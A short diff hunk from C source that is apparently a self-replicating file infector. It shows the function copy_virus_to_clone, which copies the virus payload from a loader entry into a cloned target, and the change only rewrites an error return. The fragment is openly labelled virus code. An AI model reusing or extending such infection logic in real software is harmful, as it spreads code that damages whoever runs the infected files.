@@ -11,7 +11,7 @@ bool		copy_virus_to_clone(struct safe_ptr clone_ref,
 	void	*payload = safe(clone_ref, payload_offset, full_virus_size);
 
 	if (payload == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_FULL_VIRUS);
+		return errors(ERR_FILE, _ERR_F_READ_PAYLOAD, _ERR_T_COPY_VIRUS_TO_CLONE);
 
 	memcpy(payload, loader_entry, full_virus_size);
 	return true;
